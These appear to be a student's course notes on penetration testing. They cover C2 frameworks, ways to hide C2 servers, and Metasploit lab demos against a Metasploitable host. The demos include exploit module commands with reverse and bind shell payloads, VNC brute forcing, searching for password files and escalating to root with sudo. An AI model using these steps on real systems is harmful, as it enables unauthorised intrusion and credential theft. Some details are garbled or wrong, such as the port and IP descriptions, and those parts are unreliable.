**Recap**
**Initial Access**: MITRE Tactic that covers methods to gain access into a target's system 

**Phishing** : Most commonly used inital access method 
- Leverages human error by crafting misleading and convincing a fraudulent emails 

**Remote Service though valid accounts** : Another initial access method where the attacker use existing real user accounts to gain access through a remote service such as VPN

**Scanning:** Second phase after reconnaissance
- Scanning utilizes tools to gather information such as network information and potential vulnerabilities 
	- Using Nessus, Hping, Nmap, and Zenmap 
	- NSE Scripting: Scripting that work with Nmap or Zenmap and are commonly used to test whether a service is vulnerable to an exploit 

**Exploit-DB.com**: Popular online database that contain publicly disclosed exploits, cataloged according to their Common Vulnerability and Exposure (CVE) identifiers
- SearchSploit: command line utility for Exploit-DB that allows you to take an offline copy of the entire Exploit Database wit your wherever you go 
	- **Bind shell**: Remote host opens a port for the current host to connect to 
		- Current, local host then connect to that remote host's port 
	- **Reverse Shell:** Remote host connects back to a port on the local host
___
**Command and Control**
**Command and Control (C2)**: A framework that consist of tools and techniques that attackers use to maintain communication with compromised devices following initial exploitation 
- C2 frameworks come in a variety of language and are developed by individuals and companies alike 
- Majority of C2 frameworks are open source
	- Public can read the source code and they're free
	- Few are clsoed sourced and must be paid for 
- Using **Metasploit**
	- ![[16.3.0.jpg]]
		- There is a free and a paid version
C2 framework work within C2 architecture;
1. C2 server 
	- Attacker's server, where the attacker communicate with the compromised machines 
2. C2 Agents 
	- Payload that run on the compromised machine in order to open up a connection back to C2 server 
	- This is what your victim's run 
		- When they say if you are controling the computer/ compromise machine =
			- You can use the cmd line 
![[16.3.1.jpg]]
C2 agent running on machines, it is compromised as a** zombie** 
- ![[16.3.2 2.jpg]]-
	- **Botnet**: Multiple Zombies
		- NOTE this is illegal to own
- ![[16.3.2 1 1.jpg]]
	- Entire botnet of compromised machines is controlled through the single C2 server 
	- What hackers can do, 
		- you can give the malicious email and pay them to send it to other people 
			- That way you are not attacked 

___
**Concealing the C2 server**
**Methods**
1. Redirection through proxies 
	- ![[16.3.4 1.jpg]]
		- Host directly connects to the C2 server for simplicity 
		- Real Pen test would be a bad idea because simple packet collection would detect the C2 server IP, which can be blocked 
		- Red team people can do: 
			- They get a proxy server and connect it with their Azure website/ VM
			- Blue team response; 
				- they will see the proxy server instead of the azure website/VM 
			- Red team does not care because setting up the Azure is hard to set up

2. Utilizing multiple channels 
	- ![[16.3.5 1.jpg]]
		- C2 Frameworks support is having the agent use multiple ways or channels, to communicate back to the server 
			- Main purpose: to corrupt your computers 

	- ![[16.3.6 1.jpg]]
		- Protcol used is dependent on the target's network firewall egress rules 
			- Egress rules allow HTTP/S and DNS outbound (which is why those channel are commonly used for C2 communication )
	- **Metasploit:** C2 framework is open source and use for pen testing or red team 
	- NOTE: Red team use HTTPS or DNS to look like web trafficing 

2.  Utilizing multiple C2 frameworks 
	- C2 has their own Fingerprint or indicators of compromise 
		- Ie: Metasploit's payload and agent generator, MSF venom, will generate a payload in a specified format (Ie: .exe)
		- these payload have well-known signature, and many antivirus products will alert on them and kill the payload
		- In an event were a certain AV product is killing the payload during or after execution, it may be a good idea to switch C2 framework 
	- Not all C2 framework support every Os 
		- Some only support windows 
	- Having a secondary framework that supports an OS if the primary C2 framework does not support it 
https://www.thec2matrix.com/matrix
- C2 for given project requirement pen tester could use C2 Matrix 

 NOTE: Fingerprint can be found easily because they are will known and they have signatures 
___
Instructor Demo: C2 Matrix
Go to the C2 Matrix 
[https://www.thec2matrix.com/matrix](https://www.thec2matrix.com/matrix)
- There is a channel's tab, this will tell you what Command and control programs will work with different operators
- silver is the most used 
- Metaspolit is used for all agents 
___
![[16.3.7 1.jpg]]

Define these terms 
**Command and Control (C2)**: A framework that consist of tools and techniques that attackers
use to maintain communication with compromised devices following initial exploitation 

**C2 architecture:** Hierarchical network of concurrent components linked together by connector 

**C2 Agent:** Payload that run on the compromised machine in order to open up a connection back to C2 server 

**Zombie**: Computer or device infected with malware that is controlled remotely by a  hacker 

**Botnet:** Network of infected computers that work together to carry out an attacker's goal 

___
**Metasploit**
![[16.3.8 1.jpg]]

Main Metasploit tools we focus are 
- MSF Console 
	- Main interface for Metasploit 
	- Offers a centralized console to access all the options and modules
	- MSF console runs on your local machine, not on the machines your compromise 
- Meterpreter
	- Linux-style shell that Metasploit launches when you successfully break into a target machine
	- Unlike MSF console, Meterpreter runs on the machines you compromise and not on your local machine 
- Msf venom 
	- Allows operator to craft malicious agent and payloads that will be used to communicate back with Metasploit
		- Agents and payload can be created in several format 
			- IE: .exe, .py, bash, and much more 

![[16.3.9 1.jpg]]
- modules depends on what you are trying to accomplish 
- IE: Exploit a Vulnerability 
	- Exploit module 
- IE: Recon 
	- Aux module 

____
Instructor Demo: Metasploit
 to open metasploit 
 - $msfconsole

THE FIRST STEP IS TO GO TO ZENMAP TO LOOK FOR VULNERABILITY BASED ON THEIR VERSION 

(Note: we are gooing to look at the zenmap at 172.22.117.150 from yesterday's exercise )
- anything that has a version might have a vulnerability 
- we are going to look at bindshell metasploit root shell port 1524 
![[16.3.0.1.jpg]]
- We are going to pick the last one 
- Go to google and look up bindshell metasploit root shell port 1524 exploitation 
	- Look around and see if there are any exploit 
	- We could not find anything so move to the next one

![[16.3.0.2.jpg]]
- We are going to target postgresql postgreSQl exploit 
	- We found a site that has a exploit 
		- tell us too (on metasploit terminal )
			- $search postgresql'
			- Look for any excellent but we need to make sure they will work 
![[16.3.0.3 1.jpg]]
- We are going to use 0 even though it is 0
	- this is from the website that we found 
$use 0
$option 
- This gives you available cmds 

$set RHOSTS 172.22.117.150
- Remote Hosts to what ip we want to attack
$set LHOST 172.22.117.100
- Local host to our ip

$set port LPORT 4444
- Local port this is our port 
- This is the port to listen too
$set port RPORT 5492
- This is the victim's ip address
- This is the port to 

$exploit 
- This will reach out to the remote host and port 

NOTE: 
- LOCAL host should be your/ hacker's computer
- REMOTE host should be the victim's attack from 

![[16.3.0.4.jpg]]
$exploit
- Note this shows that you are listening from this part and once they send back the request, then we are able to run commands on their computer 
- This will work for Windows but we want LINUX 

We want to attack on a linux server 
- We want to attack number 11 now because it is in linux 
![[16.3.0.5.jpg]]
- option - to fix the port numbers and other sets 

set LHOST  172.22.117.100
set RHOST 172.22.117.150
____
SAME activtiy but for unrealLIRcd 
![[16.3.0.6.jpg]]
https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson7/
- We want to use this link to exploit the unrealIRCd exploit starting from section 6

![[16.3.0.7.jpg]]
$msfconsole
$search unreal 
- We want to pick the exploit that targets the unreal IRCD
$use 2 
- To pick the second one 

![[16.3.0.8.jpg]]
set PAYLOAD cmd/unix/bind_netcat
- This will choose the type of payload you want to send 

![[16.3.0.9.jpg]]
show options 
- This is telling us that we need to set the RHOST and RPORT

NOTE:
- We are 172.22.117.100
- They are 172.22.117.150

$set lhost 172.22.117.100
$set rhost 172.22.117.150

$show options 
- We want to know if we need anything else 

resulting in - exploit failed: paylaod has not been selected (did not accept the payload)
- Use a different payload 

$set PAYLOAD cmd/unix/reverse 
$exploit 
- exploit failed connection time out \
___
Recap Metasploit
**Metasploit:** Popular C2 framework that contains a suite of tools for enumerating and exploiting servers and other networked devices 
- main tools 
	- **MSF consoles:** The main interface for Metasploit, which runs on your local machine.
	- **Meterpreter:** A Linux-style shell that runs on the machines you compromise.
	- **msf venom:** Allows the operator to craft the malicious agents and payloads that will be used to communicate back with Metasploit

![[16.3.10 1.jpg]]
![[16.3.11 1.jpg]]
____
Actvity: Metasploit 
brute force VNC: 

$Search vnc login
$use 0
- this payload will have file called vnc_password.txt which has all the most common passwords for VNC 
$options 
- options will show what is required 
set RHOST 172.22.117.150
- RHOST to victim machine 
set USERNAME root 
- change user to root 
run 
![[16.3.0.10.jpg]]
- This worked 

then google
How to lo into VNC from Kali 
- (if you have a username and password)
- Root/ password

$vncviewer 172.22.117.150
- this should work 

signing password = password

Results
![[16.3.0.11.jpg]]
- What would pop up is the VNC machine from Kali 
- and from here i can use the cmd to do anything 

mitigation: 
- Change passwords that is not common for VNC 

[https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/)
- This is more practice examples to attack using metasploit 
___
**Phase 4: Post Exploitation (What happen after you exploit a machine)**
3 task to accomplish post exploitation
1. **Enumeration and searching for useful data**
	- ![[16.3.12 1.jpg]]
		- Similar to the enumeration process during the Reconnaissance phase except we are enumerating and searching for data from *inside* the target after it has been exploited 
			- This means we search for any useful information that's available from inside the target (include from above)
2. **Persistence**
	- Process of attempting to maintain long-term access to your target
		- Creating a backdoor 
			- You can use Metasploit or using SSH access (easier to make and exposed)
			- White list your ip address
1. **Privileges escalation** 
	- Process of escalating privilege's from a less-privilege's user to a more-privileged user (or a low-privilege's to high-privilege's user) 
		- When Pen testing, it's common to land on a machine as a low- or no-privilege's user 
			- In this case, an important task for the pen tester is to perform privilege escalation 
			- Much like reconnaissance phase is split between external and internal recon
				- Post exploitation phase is split between low-privilege's post-exploitation task and high privilege post-exploitation task 
	- **High and Low privilege Post-exploitation task**
		- *Low-privilege task*
			- Require minimal permissions and includes;
				- Gathering system/OS detail 
				- Gathering services and versions 
				- Getting a list of users and groups 
		- *High-privilege task*
			- Require sudo or root privileges and include: 
				- Reading sensitive files, such as /etc/shadow and SSH keys 
				- Creating users and assigning them to privileged groups 
				- Installing new services 
				- Majoirty of persistence tasks 
		- High-privilege user has more powerful capabilities, so it is important for a pen tester to try and obtain these additional privileges

*Tips for successful privilege Escalation*
1. Utilize information gathered during enumeration
	- Gathering information allows us to identify a potential path privilege escalation 
		- Common Linux paths of privilege escalation;
			- Abusing current access 
				- IE sudo group, writable files, read access to sensitive files 
			- Exploitation of software
			- Utilizing weak passwords of privileged users 
2. use the path of least resistance
	- Search for the easiest possible way to obtain your objective instead of jumping to a difficult task 
		- IE: 
			- user keep password in a text file 
				- Instead of hijacking and keylogging, you can find the text file 
			- Finding passwords in files or abuse functionality (IE scripting run as root but world-writable) is stealthier which is a key component of red teaming 
 3. exploit vulnerable software 
	 - Exploitation of vulnerable software is often suggested as a last step due to the nature of privilege-escalation tech
		 - Involves abusing a service which has the potential to crash and bring down the machine 
			 - finding as much information as possible on the machine during enumeration is key to help find any other possible privilege-escalation paths 

____
Activity: Privilege escalation 
Steps before we go to activity 
Post Exploitation Activity Setup

We will first set up a low-privileged shell using Metasploit, which you will then use for post-exploitation and privilege-escalation techniques.

1. In Metasploit, search for `distcc`, and select it
    - `search distcc`.
    - `use 0` or `use exploit/unix/misc/distcc_exec`.
    
    - `distcc` is a tool for compiling code. It runs as a daemon with low permissions, and this version is vulnerable.
2. List the options of the module, and note that we need to set RHOSTS again as it is a required option.
    - `set RHOSTS 172.22.117.150`
3. Before running the module, we need to set a payload. List the available payloads.
    - `show payloads`
    - Note the **Description** column, as it shows in parentheses how the payload is communicating.
4. Select the **reverse** payload. Be sure NOT to select **reverse_bash**, or the exploit will not work.
    - `set PAYLOAD cmd/unix/reverse`
    - Note that we are now using the PAYLOAD with our EXPLOIT!
5. List options again, and note that there's a new blank setting, LHOST. This is our "listening host," which is the host that listens for the payload communication. In this case, our LHOST is the machine that we're currently operating on. Use `ifconfig` to show your IP (eth0) and set LHOST to that IP.
    - `set LHOST 172.22.117.100`
6. Run the module.
    - `exploit` OR `run`
    
7. Check your current user via `id`.
    - `id`
    - Note that we were able to obtain a low-privileged shell with an exploit.
    - Leave the current window and Metasploit session open, as you will use it in the next activity

![[txt files with password.jpg]]
NOTE:  now that you are able to sign into the ip address 172.22.117.150 as Daemon, we want to sign into root
1. We want too use find or grep command to look for admin, password, key, or secret 
	1.  $find / -type f -iname"[*] admin [*].txt" 
		- find: search for 
		- / : Starting from root 
		- -type f: Search for any files 
		- ["*]admin[*].txt" : search any text that has admin text 
			- NO []
	- if you add 2>/dev/null in the end 
		- This will remove all the permission deny noticed 
	- This step will help you find text file that  Daemon has permission to access 
		- /var/tmp/adminpassword.txt
			- The file name is adminpassword

	2. cat /var/tmp/adminpassword.txt
		- This will tell you msfadmin: cybersecurity 
			- msfadmin is the username  
			- cybersecurity is the password
![[Gang root.jpg]]
	3. In a new terminal you want to sign in as root 
		- The ip address that you want to attack 172.22.117.150
		- SSH msfadmin@172.22.117.150
		- password: cybersecurity 
		- SUDO -l 
			- if it ihas the word (ALL)ALL
				- You have sudo command
		- SUDO SI
			- You are root 

___
![[16.3.13.jpg]]